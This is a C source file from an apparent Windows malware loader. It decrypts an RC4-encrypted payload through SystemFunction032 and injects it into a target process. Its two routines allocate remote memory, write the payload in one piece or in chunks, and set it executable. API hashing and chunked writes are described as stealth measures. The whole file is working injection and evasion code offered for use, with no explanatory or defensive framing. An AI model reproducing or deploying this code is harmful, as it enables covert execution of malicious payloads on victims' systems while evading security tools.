/*
	file that handle the decryption/injection part of the payload 
*/

#include <Windows.h>
#include "Structs.h"
#include "Types.h"
#include "Header.h"
#include "Debug.h"


#define BUFSIZE		1024



/*
	do rc4 decryption of the payload via Advapi.SystemFunction032 function
*/
BOOL Rc4ViaSF032(PVOID pPayloadData, SIZE_T sPayloadSize, PBYTE pRc4Key, DWORD dwRc4KeySize) {
	
	NTSTATUS	STATUS	= NULL;
	USTRING		Key		= { .Buffer = pRc4Key,			.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
				Img		= { .Buffer = pPayloadData ,	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryH(ADVAPI32DLL), SystemFunction032_StrHashed);


	if (SystemFunction032 && !NT_SUCCESS(STATUS = SystemFunction032(&Img, &Key))) {
#ifdef DEBUG
		PRINTA("[!] SystemFunction032 FAILED With Error: 0x%0.8X (Injec.c:28)\n", STATUS);
#endif
		return FALSE;
	}
	
	return TRUE;

}


/* 
	1st injection option (more stable - less stealthy):
		
		- allocation
		- dectyption
		- writing 
		- permissions

*/
BOOL InjectPayload(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress, IN PBYTE pRc4Key, IN DWORD dwRc4KeySize) {

	fnNtAllocateVirtualMemory	NtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddressH(GetModuleHandleH(NTDLLDLL), NtAllocateVirtualMemory_StrHashed);
	fnNtProtectVirtualMemory	NtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddressH(GetModuleHandleH(NTDLLDLL), NtProtectVirtualMemory_StrHashed);
	fnNtWriteVirtualMemory		NtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddressH(GetModuleHandleH(NTDLLDLL), NtWriteVirtualMemory_StrHashed);

	if (hProcess == NULL || pPayload == NULL || sPayloadSize < 0 || NtAllocateVirtualMemory == NULL || NtProtectVirtualMemory == NULL || NtWriteVirtualMemory == NULL)
		return FALSE;


	NTSTATUS	STATUS					= NULL;
	
	SIZE_T		NumberOfBytesWritten	= NULL;
	DWORD		OldProtection			= NULL;
	
	ULONG_PTR   uAddress1				= (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)(sPayloadSize + (BUFSIZE * 4 * 2)));
	PVOID		uAddress2				= NULL;

	if (!uAddress1)
		return FALSE;

	_memcpy(uAddress1, pPayload, sPayloadSize);

	if ((STATUS = NtAllocateVirtualMemory(hProcess, &uAddress2, 0, &sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X (Injec.c:72) \n", STATUS);
#endif // DEBUG
		return FALSE;
	}


	if (!Rc4ViaSF032(uAddress1, sPayloadSize, pRc4Key, dwRc4KeySize)) {
		return FALSE;
	}


	if ((STATUS = NtWriteVirtualMemory(hProcess, uAddress2, uAddress1, sPayloadSize, &NumberOfBytesWritten)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X (Injec.c:85) \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	if ((STATUS = NtProtectVirtualMemory(hProcess, &uAddress2, &sPayloadSize, PAGE_EXECUTE_READWRITE, &OldProtection)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X (Injec.c:92) \n", STATUS);
#endif // DEBUG
return FALSE;
	}

	LocalFree((HLOCAL)uAddress1);

	*ppAddress = (PVOID)(uAddress2);

	return TRUE;

}




/*
2st injection option (more stealthy - less stable):
	- MEM_RESERVE && PAGE_READONLY allocation
	- MEM_COMMIT && PAGE_READWRITE allocation over first allocated memory (looping)
	- decryption
	- writing (as chunks) (looping)
	- memory permissions fixing (RWX) (looping)
*/


BOOL InjectPayload2(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress, IN PBYTE pRc4Key, IN DWORD dwRc4KeySize) {

	fnNtAllocateVirtualMemory NtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddressH(GetModuleHandleH(NTDLLDLL), NtAllocateVirtualMemory_StrHashed);
	fnNtProtectVirtualMemory NtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddressH(GetModuleHandleH(NTDLLDLL), NtProtectVirtualMemory_StrHashed);
	fnNtWriteVirtualMemory NtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddressH(GetModuleHandleH(NTDLLDLL), NtWriteVirtualMemory_StrHashed);

	if (hProcess == NULL || pPayload == NULL || sPayloadSize < 0 || NtAllocateVirtualMemory == NULL || NtProtectVirtualMemory == NULL || NtWriteVirtualMemory == NULL)
		return FALSE;


	BOOL			STATE		= TRUE;
	NTSTATUS		STATUS		= 0x0;


	ULONG_PTR		uAddress1	= (ULONG_PTR)LocalAlloc(LPTR, (sPayloadSize + ((BUFSIZE * 4) * 2)));
	ULONG_PTR		uAddress2	= NULL;
	LPVOID			uAddress3	= NULL;

	SIZE_T			sTmpSize1	= (SIZE_T)(sPayloadSize + ((BUFSIZE * 4) * 2)),
					sTmpSize2	= NULL,
					sTmpSize3	= NULL;


	DWORD			dwLoop		= (DWORD)((sPayloadSize / (BUFSIZE * 4)) + ((sPayloadSize % (BUFSIZE * 4)) != 0));

	SIZE_T			sNumberOfBytesWritten	= NULL;
	DWORD			dwOldPermissions		= NULL;


	if (!uAddress1)
		goto _finish;

	// copy payload to allocated memory 
	_memcpy((PVOID)uAddress1, pPayload, sPayloadSize);

	// Allocating 1st 
	if ((STATUS = NtAllocateVirtualMemory(hProcess, &uAddress2, 0, &sTmpSize1, MEM_RESERVE, PAGE_READONLY)) != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X (Injec.c:156)\n", STATUS);
#endif // DEBUG
		STATE = FALSE; goto _finish;						
	}

#ifdef DEBUG
	PRINTA("[i] Allocated uAddress2 [RO - MR] : 0x%p \n", uAddress2);
	PRINTA("[i] sTmpSize1 : %ld \n", sTmpSize1);
	PRINTA("[i] dwLoop : %d \n", dwLoop);
#endif // DEBUG



	// Allocating 2nd
	uAddress3 = (LPVOID)(uAddress2 + BUFSIZE);
	sTmpSize2 = BUFSIZE * 4;

	for (size_t i = 0; i < dwLoop; i++) {

		if ((STATUS = NtAllocateVirtualMemory(hProcess, &uAddress3, 0, &sTmpSize2, MEM_COMMIT, PAGE_READWRITE)) != 0x0) {
#ifdef DEBUG
			PRINTA("[!] NtAllocateVirtualMemory [%0.2d] Failed With Error : 0x%0.8X (Injec.c:177) \n", i, STATUS);		
			//STATE = FALSE; goto _finish;						// idc
#endif // DEBUG
		}
		
		uAddress3 = (LPVOID)((ULONG_PTR)uAddress3 + sTmpSize2);
	}



	// decrypting using rc4
	if (!Rc4ViaSF032(uAddress1, sPayloadSize, pRc4Key, dwRc4KeySize)) {
		STATE = FALSE; goto _finish;
	}

	
	// writing to target process
	uAddress3 = (LPVOID)(uAddress2 + BUFSIZE);
	sTmpSize2 = BUFSIZE * 4;

	for (size_t i = 0; i < dwLoop; i++) {

		if ((STATUS = NtWriteVirtualMemory(hProcess, uAddress3, uAddress1, (ULONG)sTmpSize2,  &sNumberOfBytesWritten)) != 0x0 || sNumberOfBytesWritten != sTmpSize2) {
#ifdef DEBUG
			PRINTA("[!] NtWriteVirtualMemory [%0.2d] Failed With Error : 0x%0.8X (Injec.c:201) \n", i, STATUS);
#endif // DEBUG
			STATE = FALSE; goto _finish;
		}

		// clearing ...
		_ZeroMemory(uAddress1, sNumberOfBytesWritten);

		uAddress3 = (LPVOID)((ULONG_PTR)uAddress3 + sTmpSize2);
		uAddress1 = (ULONG_PTR)(uAddress1 + sTmpSize2);
		sTmpSize3 += sNumberOfBytesWritten;
		
		if (sTmpSize3 >= sPayloadSize)
			break;
	}



	// small check
	if (sTmpSize3 < sPayloadSize){
#ifdef DEBUG
		PRINTA("[!] Didnt Write All The Payload, Written : %ld From : %ld \n", sTmpSize3, sPayloadSize);
		STATE = FALSE; goto _finish;
#endif // DEBUG
	}


	
	// setting mem permissions 
	uAddress3 = uAddress2 + BUFSIZE;
	sTmpSize2 = BUFSIZE * 4;

	for (size_t i = 0; i < dwLoop; i++){

		if ((STATUS = NtProtectVirtualMemory(hProcess, &uAddress3, &sTmpSize2, PAGE_EXECUTE_READWRITE, &dwOldPermissions)) != 0x0) {
#ifdef DEBUG
			PRINTA("[!] NtProtectVirtualMemory [%0.2d] Failed With Error : 0x%0.8X (Injec.c:237)\n", i, STATUS);
#endif // DEBUG
			//STATE = FALSE; goto _finish;						// idc
		}

		uAddress3 = (LPVOID)((ULONG_PTR)uAddress3 + sTmpSize2);
	}



	// output
	*ppAddress = (PVOID)(uAddress2 + BUFSIZE);

_finish:
	return STATE;

}

/*
	
	#############################################################	[uAddress2]
	#															#
	#					EMPTY [RO - MR] MEM.					#	>>> 1024 BYTES
	#															#
	#############################################################	[ppAddress]
	#															#
	#			THE PAYLOAD - WRITTIN IN CHUNKS 				#
	#															#
	#															#
	#															#
	#															#
	#															#
	#															#
	#															#
	#															#
	#															#
	#															#
	#############################################################


*/








 